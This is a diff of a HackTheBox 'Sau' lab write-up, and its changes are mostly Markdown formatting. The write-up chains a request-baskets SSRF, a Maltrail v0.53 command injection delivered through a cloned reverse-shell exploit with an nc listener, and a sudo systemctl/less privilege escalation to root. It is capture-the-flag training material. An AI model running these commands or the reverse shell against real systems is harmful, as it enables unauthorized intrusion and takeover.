@@ -1,19 +1,19 @@
 # Sau
 
-![hackthebox.com - © HACKTHEBOX](<../../../../.gitbook/assets/logo-htb2 (1).png>)
+![hackthebox.com - © HACKTHEBOX](.gitbook/assets/logo-htb2.png)
 
-***
+---
 
 ## Intro
 
-| Box Info            | ![](../../../../.gitbook/assets/sau.png)       |
-| ------------------- | ---------------------------------------------- |
+| Box Info           | ![](.gitbook/assets/sau.png)                   |
+| :----------------- | ---------------------------------------------- |
 | 🔗 Name             | [Sau](https://app.hackthebox.com/machines/551) |
 | 🎯 Target IP        | `10.10.11.224`                                 |
-| 📈 Difficulty level | 🟩Easy                                         |
+| 📈 Difficulty level | 🟩Easy                                          |
 | 🐧OS                | Linux                                          |
 
-***
+---
 
 ## Recon
 
@@ -97,9 +97,9 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Browse to `http://10.10.11.224:55555/`
 
-* Powered by [request-baskets](https://github.com/darklynx/request-baskets) - version: `1.2.1` - a web service used to colect arbitrary HTTP requests and inspect them via RESTful API or simple web UI
+- Powered by [request-baskets](https://github.com/darklynx/request-baskets) - version: `1.2.1` - a web service used to colect arbitrary HTTP requests and inspect them via RESTful API or simple web UI
 
-***
+---
 
 ## Exploitation
 
@@ -107,20 +107,21 @@ Browse to `http://10.10.11.224:55555/`
 
 The **request-baskets** project has been associated with a **Server-Side Request Forgery** (`SSRF`) vulnerability, specifically identified as [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163).
 
-* [CVE-2023-27163 | INCIBE-CERT | INCIBE](https://www.incibe.es/en/incibe-cert/early-warning/vulnerabilities/cve-2023-27163)
-* [Request-Baskets 1.2.1 Server-Side Request Forgery (CVE-2023–27163) | by Imène ALLOUCHE | Medium](https://medium.com/@li_allouche/request-baskets-1-2-1-server-side-request-forgery-cve-2023-27163-2bab94f201f7)
-* This vulnerability affects request-baskets up to version 1.2.1 and allows attackers to forward HTTP requests to internal or private services.
-* The vulnerability is present in the `/api/baskets/{name}` component, which can be exploited to access network resources and sensitive information.
-* **Information Disclosure:** The SSRF lets attackers retrieve any internal resource over HTTP, enabling exfiltration of sensitive data beyond just unauthenticated images.
-* **Unauthenticated Internal Access:** Exploitation grants access to internal services like Nginx, APIs, and databases across the local network without credentials.
-* **Port Scanning and Enumeration:** Attackers can scan ports and map internal hosts, exposing network architecture and potential attack surfaces.
+- [CVE-2023-27163 | INCIBE-CERT | INCIBE](https://www.incibe.es/en/incibe-cert/early-warning/vulnerabilities/cve-2023-27163)
+- [Request-Baskets 1.2.1 Server-Side Request Forgery (CVE-2023–27163) | by Imène ALLOUCHE | Medium](https://medium.com/@li_allouche/request-baskets-1-2-1-server-side-request-forgery-cve-2023-27163-2bab94f201f7)
+
+- This vulnerability affects request-baskets up to version 1.2.1 and allows attackers to forward HTTP requests to internal or private services.
+- The vulnerability is present in the `/api/baskets/{name}` component, which can be exploited to access network resources and sensitive information.
+- **Information Disclosure:** The SSRF lets attackers retrieve any internal resource over HTTP, enabling exfiltration of sensitive data beyond just unauthenticated images.
+- **Unauthenticated Internal Access:** Exploitation grants access to internal services like Nginx, APIs, and databases across the local network without credentials.
+- **Port Scanning and Enumeration:** Attackers can scan ports and map internal hosts, exposing network architecture and potential attack surfaces.
 
 An exploit for this vulnerability has been published, demonstrating how attackers can leverage the SSRF flaw to create a local proxy for HTTP requests on the targeted machine.
 
-* [SSRF Vulnerability Exploit for Request-Baskets (CVE-2023-27163)](https://github.com/mathias-mrsn/request-baskets-v121-ssrf)
-* [entr0pie/CVE-2023-27163: Proof-of-Concept for Server Side Request Forgery (SSRF) in request-baskets (<= v.1.2.1)](https://github.com/entr0pie/CVE-2023-27163)
-* [PoC via Bash - Request-Baskets 1.2.1 Server-Side Request Forgery - exploit database | Vulners.com](https://vulners.com/packetstorm/PACKETSTORM:174128)
-* The exploit calls the vulnerable API component to create a new basket, initiating a `POST` request. The attacker can modify the `forward_url` parameter to a local service and set the `proxy_response` to `true`.
+- [SSRF Vulnerability Exploit for Request-Baskets (CVE-2023-27163)](https://github.com/mathias-mrsn/request-baskets-v121-ssrf)
+- [entr0pie/CVE-2023-27163: Proof-of-Concept for Server Side Request Forgery (SSRF) in request-baskets (<= v.1.2.1)](https://github.com/entr0pie/CVE-2023-27163)
+- [PoC via Bash - Request-Baskets 1.2.1 Server-Side Request Forgery - exploit database | Vulners.com](https://vulners.com/packetstorm/PACKETSTORM:174128)
+- The exploit calls the vulnerable API component to create a new basket, initiating a `POST` request. The attacker can modify the `forward_url` parameter to a local service and set the `proxy_response` to `true`.
 
 Let's try the following PoC by `entr0pie`:
 
@@ -140,12 +141,12 @@ bash ./CVE-2023-27163.sh http://10.10.11.224:55555/ http://127.0.0.1:80
 
 Visit the generated URL -> `http://10.10.11.224:55555/izlhms`
 
-* The webserver on port `80` is powered by Maltrail `v0.53`
-* Same on port `8338`
+- The webserver on port `80` is powered by Maltrail `v0.53`
+- Same on port `8338`
 
-![](../../../../.gitbook/assets/2025-07-01_10-11-49_195.png)
+![](.gitbook/assets/2025-07-01_10-11-49_195.png)
 
-***
+---
 
 ## Foothold
 
@@ -153,28 +154,28 @@ Visit the generated URL -> `http://10.10.11.224:55555/izlhms`
 
 Maltrail `v0.53` is associated with the [CVE-2023-27163](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2023-27163) vulnerability, which is a **remote code execution** (**RCE**) flaw.
 
-* This vulnerability allows attackers to execute arbitrary code on the target system without authentication. The exploit leverages a command injection vulnerability in the `params.get("username")` parameter of the `mailtrail/core/http.py` file
-* [Exploiting Maltrail v0.53 — Unauthenticated Remote Code Execution (RCE) | by Security Lit Limited | Medium](https://securitylit.medium.com/exploiting-maltrail-v0-53-unauthenticated-remote-code-execution-rce-66d0666c18c5)
-* [GitHub - spookier/Maltrail-v0.53-Exploit: RCE Exploit For Maltrail-v0.53](https://github.com/spookier/Maltrail-v0.53-Exploit)
-  * The `username` parameter of the login page does not properly sanitize the input, allowing an OS command injection attack
-* Check [manual exploit by Ippsec](https://www.youtube.com/watch?v=H6QfYGeGdGQ\&t=780s)
+- This vulnerability allows attackers to execute arbitrary code on the target system without authentication. The exploit leverages a command injection vulnerability in the `params.get("username")` parameter of the `mailtrail/core/http.py` file
+- [Exploiting Maltrail v0.53 — Unauthenticated Remote Code Execution (RCE) | by Security Lit Limited | Medium](https://securitylit.medium.com/exploiting-maltrail-v0-53-unauthenticated-remote-code-execution-rce-66d0666c18c5)
+- [GitHub - spookier/Maltrail-v0.53-Exploit: RCE Exploit For Maltrail-v0.53](https://github.com/spookier/Maltrail-v0.53-Exploit)
+  - The `username` parameter of the login page does not properly sanitize the input, allowing an OS command injection attack
+- Check [manual exploit by Ippsec](https://www.youtube.com/watch?v=H6QfYGeGdGQ&t=780s)
 
 ```bash
 # First get a new SSRF url with /login
 bash ./CVE-2023-27163.sh http://10.10.11.224:55555/ http://127.0.0.1:80/login
 ```
 
-![](../../../../.gitbook/assets/2025-07-01_10-42-41_196.png)
+![](.gitbook/assets/2025-07-01_10-42-41_196.png)
 
-* Use the generated URL in the following Maltrail Exploit -> `http://10.10.11.224:55555/oxmauw`
+- Use the generated URL in the following Maltrail Exploit -> `http://10.10.11.224:55555/oxmauw`
 
 ```bash
 git clone https://github.com/spookier/Maltrail-v0.53-Exploit.git
 cd Maltrail-v0.53-Exploit
 ```
 
-* The exploit encodes a reverse shell payload in Base64 to bypass potential WAF, IPS/IDS protections, delivers it via a `curl` request to the target URL and executes it to establish a reverse shell back to the attacker's IP and port.
-* In this specific case, remove the `+ "/login"` on line 28 of the `exploit.py`, save and run the modified script
+- The exploit encodes a reverse shell payload in Base64 to bypass potential WAF, IPS/IDS protections, delivers it via a `curl` request to the target URL and executes it to establish a reverse shell back to the attacker's IP and port.
+- In this specific case, remove the ` + "/login"` on line 28 of the `exploit.py`, save and run the modified script
 
 ```bash
 # Start listener on KALI
@@ -185,7 +186,7 @@ nc -nvlp 443
 python3 exploit.py 10.10.14.5 443 http://10.10.11.224:55555/oxmauw
 ```
 
-![](../../../../.gitbook/assets/2025-07-01_10-45-30_197.png)
+![](.gitbook/assets/2025-07-01_10-45-30_197.png)
 
 ```bash
 $ id
@@ -193,7 +194,7 @@ id
 uid=1001(puma) gid=1001(puma) groups=1001(puma)
 ```
 
-* Shell upgrade
+- Shell upgrade
 
 ```bash
 # script
@@ -218,7 +219,7 @@ puma@sau:~$ cat /home/puma/user.txt
 71a6b***************************
 ```
 
-***
+---
 
 ## Privilege Escalation
 
@@ -239,13 +240,13 @@ systemctl --version
 	systemd 245 (245.4-4ubuntu3.22)
 ```
 
-* `puma` user can run a specific `systemctl` command as root without password
+- `puma` user can run a specific `systemctl` command as root without password
 
 Google `Systemd 245.4 CVE`
 
-* Found [CVE-2023-26604](https://nvd.nist.gov/vuln/detail/CVE-2023-26604)
-* Before version 247, **systemd** failed to set `LESSSECURE=1` when running `systemctl status` via `sudo`, allowing `less` (pager) to launch other programs as `root` if the output didn’t fit the terminal. This could lead to **local privilege escalation** if `sudoers` permitted `systemctl` execution.
-* [CVE-2023–26604. How did i find it? | by Zenmovie | Medium](https://medium.com/@zenmoviefornotification/saidov-maxim-cve-2023-26604-c1232a526ba7)
+- Found [CVE-2023-26604](https://nvd.nist.gov/vuln/detail/CVE-2023-26604)
+- Before version 247, **systemd** failed to set `LESSSECURE=1` when running `systemctl status` via `sudo`, allowing `less` (pager) to launch other programs as `root` if the output didn’t fit the terminal. This could lead to **local privilege escalation** if `sudoers` permitted `systemctl` execution.
+- [CVE-2023–26604. How did i find it? | by Zenmovie | Medium](https://medium.com/@zenmoviefornotification/saidov-maxim-cve-2023-26604-c1232a526ba7)
 
 ### Shell as root
 
@@ -255,10 +256,10 @@ Run the following command with `puma` user and exploit `less`
 sudo /usr/bin/systemctl status trail.service
 ```
 
-* Since the weird TTY and screen, the output gets passed to `less`
-* Enter `!sh` that will run `sh` and drops to a shell with the `root` user
+- Since the weird TTY and screen, the output gets passed to `less`
+- Enter `!sh` that will run `sh` and drops to a shell with the `root` user
 
-![](../../../../.gitbook/assets/2025-07-01_12-29-02_200.png)
+![](.gitbook/assets/2025-07-01_12-29-02_200.png)
 
 ```bash
 # Root Flag
@@ -267,7 +268,7 @@ cat /root/root.txt
 101ef***************************
 ```
 
-***
+---
 
 ## Summary
 
@@ -281,11 +282,12 @@ cat /root/root.txt
 8. Found `systemd` `less` pager vulnerability (CVE-2023-26604).
 9. Abused `less` to execute commands as `root`.
 
-***
+---
 
 ## Extra
 
-* [HTB: Sau | 0xdf hacks stuff](https://0xdf.gitlab.io/2024/01/06/htb-sau.html)
-* [Sau - Ippsec](https://www.youtube.com/watch?v=H6QfYGeGdGQ)
+- [HTB: Sau | 0xdf hacks stuff](https://0xdf.gitlab.io/2024/01/06/htb-sau.html)
+- [Sau - Ippsec](https://www.youtube.com/watch?v=H6QfYGeGdGQ)
 
-***
+------
+
